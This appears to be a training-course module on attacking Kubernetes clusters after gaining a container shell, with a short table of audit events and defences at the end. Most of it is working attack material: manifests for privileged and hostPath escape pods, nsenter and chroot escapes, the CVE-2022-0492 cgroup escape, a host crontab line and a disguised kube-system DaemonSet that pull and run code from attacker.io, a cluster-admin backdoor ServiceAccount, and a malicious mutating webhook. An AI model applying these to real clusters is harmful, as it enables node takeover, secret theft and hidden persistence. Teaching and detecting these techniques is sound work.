# Execution, Privilege Escalation & Persistence

> **Module 03 · Course 38** — You have a container shell. Now what? This module covers the techniques attackers use to turn that limited container shell into full node access, install persistence that survives restarts, and leave backdoors that live through credential rotation.

---

## The Three Goals After Initial Access

```
Container shell
       │
       ├──► Execution      — Run your tools, not just the app's binaries
       │
       ├──► Privesc        — Escape the container, own the node
       │
       └──► Persistence    — Survive pod restarts, credential rotation, and eviction
```

These three goals overlap. The privileged pod technique does all three at once — it's both an escape AND a persistence mechanism if you deploy it as a DaemonSet.

---

## 1. kubectl exec Internals

Before learning to abuse exec, understand what it does. This matters for detection.

```
kubectl exec -it pod/victim -- bash
         │
         ▼
1. kubectl sends: POST /api/v1/namespaces/default/pods/victim/exec
   params: ?command=bash&stdin=true&stdout=true&tty=true
         │
         ▼
2. API server checks RBAC: does the caller have
   verb=create on resource=pods/exec in this namespace?
         │
         ▼
3. API server proxies via SPDY/WebSocket upgrade to the kubelet
   on the node where the pod runs: https://NODE:10250/exec/...
         │
         ▼
4. kubelet calls the container runtime (containerd):
   ExecSync() — attaches to the container's existing namespaces:
   - PID namespace: share the container's process tree
   - Mount namespace: same filesystem as the container
   - Net namespace: same network stack
   - UTS, IPC: same hostname and IPC resources
         │
         ▼
5. stdin/stdout stream over WebSocket back to kubectl
```

The key audit log event: `create pods/exec` in the namespace. This is what defenders watch for in the K8s audit log. The verb is `create` not `exec` — a subtle gotcha that causes misconfigured audit policies to miss it.

```bash
# Attacker with stolen cluster-admin token:
# Step 1: Find an interesting pod
kubectl get pods -A | grep -E "api|db|vault|secret"

# Step 2: exec into it
kubectl exec -n production pod/api-server -it -- bash

# Without kubectl, same thing with curl (attacker already inside the cluster):
# SPDY protocol upgrade — complex to show, but the API call is:
curl -k -X POST \
  https://kubernetes.default/api/v1/namespaces/production/pods/api-server/exec \
  -H "Authorization: Bearer $TOKEN" \
  '?command=id&stdin=true&stdout=true&stderr=true'
```

---

## 2. Privileged Pod Escape

The most direct path from container to node root. A privileged container has all Linux capabilities enabled and unrestricted `/dev` access — including `/dev/mem` (direct memory), `/dev/sda` (direct disk access), and the ability to load kernel modules.

```yaml
# escape-pod.yaml — deploy this to get node root
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: default
spec:
  hostNetwork: true      # Use the node's network namespace
  hostPID: true          # See all processes on the node
  hostIPC: true          # Share IPC namespace with host
  containers:
  - name: escape
    image: alpine:3.20
    securityContext:
      privileged: true   # THE key flag
      runAsUser: 0       # Run as root inside container
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /            # Mount the entire host filesystem
```

```bash
kubectl apply -f escape-pod.yaml
kubectl exec -it escape-pod -- sh

# Inside the privileged container:
# nsenter: enter the host's namespaces
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# ^ --target 1 = PID 1 = the host's init process
# ^ --mount = use the host's mount namespace
# ^ Result: you now have a bash shell in the HOST's namespace
# ^ You are root on the node.

# Alternative: chroot into the mounted host filesystem
chroot /host bash
# Now you have the host's root filesystem as your /
# cat /host/etc/shadow → real node's shadow file
# /host/usr/bin/kubectl → the node's kubectl
```

The privilege escalation path:

```
container (privileged=true)
         │
         ├── nsenter --target 1 → Host init namespace → root shell on node
         │
         ├── chroot /host → Host filesystem → read /etc/shadow, write cron
         │
         └── mount /dev/sda1 /mnt → Host disk → direct disk read/write
```

---

## 3. hostPath: / Technique (Without Privileged Flag)

A pod doesn't need `privileged: true` to do damage. Just mounting `hostPath: /` gives read access to the entire host filesystem — and write access to everything the container user can write to.

```yaml
# hostpath-attack.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-attack
  namespace: default
spec:
  containers:
  - name: attacker
    image: alpine:3.20
    command: [sleep, "86400"]
    volumeMounts:
    - name: node-root
      mountPath: /node
  volumes:
  - name: node-root
    hostPath:
      path: /
```

```bash
kubectl exec -it hostpath-attack -- sh

# Read everything:
cat /node/etc/shadow
cat /node/etc/kubernetes/pki/ca.key    # Node's CA private key
cat /node/var/lib/kubelet/config.yaml  # Kubelet config
ls /node/root/.ssh/                    # Root's SSH keys

# Write persistence — cron job on the host:
echo '* * * * * root curl https://attacker.io/beacon | bash' \
  >> /node/etc/crontab

# Kubernetes secret files are stored on the node at:
ls /node/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/
# → All SA tokens for all pods on this node
```

---

## 4. CAP_SYS_ADMIN — The Super-Capability

Linux capabilities are a way to subdivide root powers. `CAP_SYS_ADMIN` is the broadest capability — it enables ~40 different privileged operations including mounting filesystems, manipulating namespaces, and loading kernel modules.

```yaml
# cap-sys-admin-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: cap-abuse
spec:
  containers:
  - name: c
    image: ubuntu:22.04
    securityContext:
      capabilities:
        add: ["SYS_ADMIN"]
    command: [sleep, "86400"]
```

```bash
kubectl exec -it cap-abuse -- bash

# With SYS_ADMIN: mount a tmpfs over a sensitive path:
mount -t tmpfs tmpfs /etc

# Or: re-mount procfs to escape /proc restrictions:
unshare --user --pid --mount --fork --map-root-user bash

# Or: use the cgroup filesystem to trigger host file writes:
# (The classic cgroup notify-on-release escape from CVE-2022-0492):
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# Wait 1-2 seconds, then:
cat /output  # → Host's /etc/shadow
```

---

## 5. Backdoor ServiceAccount + ClusterRoleBinding

The most reliable persistence: create a new ServiceAccount with cluster-admin, generate a long-lived token (or rely on the auto-generated one), and store it outside the cluster.

```bash
# Create a secret backdoor SA with cluster-admin:
kubectl create serviceaccount backdoor-sa -n kube-system

kubectl create clusterrolebinding backdoor-crb \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:backdoor-sa

# Create a long-lived token (K8s 1.24+ requires explicit token creation):
kubectl create token backdoor-sa -n kube-system --duration=8760h
# → This token is valid for 1 year. Save it.

# Or create a permanent Secret-based token (older style, but persists indefinitely):
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Secret
metadata:
  name: backdoor-token
  namespace: kube-system
  annotations:
    kubernetes.io/service-account.name: backdoor-sa
type: kubernetes.io/service-account-token
EOF

# Retrieve the token:
kubectl get secret backdoor-token -n kube-system \
  -o jsonpath='{.data.token}' | base64 -d
```

This persistence survives:
- Pod restarts (it's not in a pod)
- Container image updates
- Helm chart upgrades
- Rolling deployments
- Node replacements

What kills it: explicitly running `kubectl delete clusterrolebinding backdoor-crb` — which only happens if the security team audits RBAC.

---

## 6. DaemonSet Implant

A DaemonSet runs exactly one pod on every node. If you delete the pod, the DaemonSet controller creates a new one immediately. This makes it an ideal persistence mechanism.

```yaml
# implant-daemonset.yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-monitor       # Innocent-sounding name
  namespace: kube-system   # Hidden among system components
spec:
  selector:
    matchLabels:
      app: node-monitor
  template:
    metadata:
      labels:
        app: node-monitor
    spec:
      tolerations:
      - operator: Exists   # Run on ALL nodes including control-plane
      hostNetwork: true
      hostPID: true
      containers:
      - name: monitor
        image: alpine:3.20
        command:
        - sh
        - -c
        - |
          while true; do
            curl -sf https://attacker.io/c2 | sh
            sleep 300
          done
        securityContext:
          privileged: true
        volumeMounts:
        - name: host
          mountPath: /host
      volumes:
      - name: host
        hostPath:
          path: /
```

```bash
kubectl apply -f implant-daemonset.yaml

# DaemonSet is running on all nodes:
kubectl get pods -n kube-system -l app=node-monitor -o wide
# NAME                  READY   STATUS    NODE
# node-monitor-abc12    1/1     Running   node-1
# node-monitor-def34    1/1     Running   node-2
# node-monitor-ghi56    1/1     Running   control-plane

# If you delete one:
kubectl delete pod node-monitor-abc12 -n kube-system
# → Immediately recreated by the DaemonSet controller
```

---

## 7. Malicious Admission Webhook

The most sophisticated persistence. A `MutatingWebhookConfiguration` intercepts every pod creation across the entire cluster and can inject env vars, volumes, or sidecar containers.

```yaml
# backdoor-webhook.yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: pod-defaults
webhooks:
- name: inject.internal.svc
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore    # Don't break pods if webhook server is down
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  clientConfig:
    # Attacker runs a webhook server inside the cluster (harder to detect)
    service:
      namespace: kube-system
      name: pod-defaults
      port: 443
    # Or external:
    # url: "https://attacker.io/mutate"
    caBundle: BASE64_CA
  namespaceSelector:
    matchExpressions:
    - key: kubernetes.io/metadata.name
      operator: NotIn
      values: [kube-system]  # Don't inject into kube-system (would be obvious)
```

When this webhook is active, every pod created gets mutated. The webhook server can:
- Inject a sidecar container that exfiltrates environment variables
- Mount a volume containing the attacker's ssh key
- Override the pod's command to run a beacon before the real app

What makes this hard to detect: the webhook name `pod-defaults` sounds legitimate. It's in the cluster's admission configuration, not in any namespace's pods. Most security teams don't audit `MutatingWebhookConfigurations`.

---

## What Defenders See

| Technique | Audit log event | Falco alert | Prevention |
|-----------|----------------|-------------|------------|
| `kubectl exec` | `create pods/exec` | `Terminal shell in container` | OPA: deny exec via constraint |
| Privileged pod | `create pods` with privileged=true | `Launch Privileged Container` | Kyverno: deny privileged=true |
| hostPath: / | `create pods` with hostPath | `Container Mounted Sensitive Volume` | OPA: deny hostPath or restrict to specific paths |
| Backdoor SA | `create serviceaccounts`, `create clusterrolebindings` | — | Audit: alert on new CRBs to cluster-admin |
| DaemonSet implant | `create daemonsets` in kube-system | — | OPA: deny non-system DaemonSets in kube-system |
| Admission webhook | `create mutatingwebhookconfigurations` | — | Alert on any new MutatingWebhookConfiguration |
| CAP_SYS_ADMIN | `create pods` with capabilities | `Launch Container with Added Capabilities` | Kyverno: deny dangerous capabilities |

The pattern: **every technique creates something in the K8s API** — and that creation is in the audit log. The problem is that most clusters don't alert on these audit events. Modules 09 and 11 fix that.

---

## Checkpoint

You're ready for Module 04 when you can answer:

1. What K8s RBAC permission does `kubectl exec` require? (Be specific about verb and resource.)
2. What does `nsenter --target 1` do, and why PID 1?
3. A pod with `hostPath: /` but `privileged: false` — can it write to `/etc/crontab` on the host? Why or why not?
4. What is the difference between `hostPID: true` and `privileged: true`?
5. Why does a DaemonSet in `kube-system` with `tolerations: - operator: Exists` run on the control-plane node?
6. What does `failurePolicy: Ignore` on a webhook mean for availability vs. security?
7. If an attacker creates a ClusterRoleBinding to cluster-admin, what audit event is generated?
8. Why does the backdoor SA approach survive a full rolling deployment of all application pods?
9. What Linux kernel feature does CVE-2022-0492 abuse for a container escape?
10. How would you detect a malicious MutatingWebhookConfiguration without looking at audit logs?

➡ Next: **Lateral Movement & Data Exfiltration** — moving from one compromised pod to the rest of the cluster.
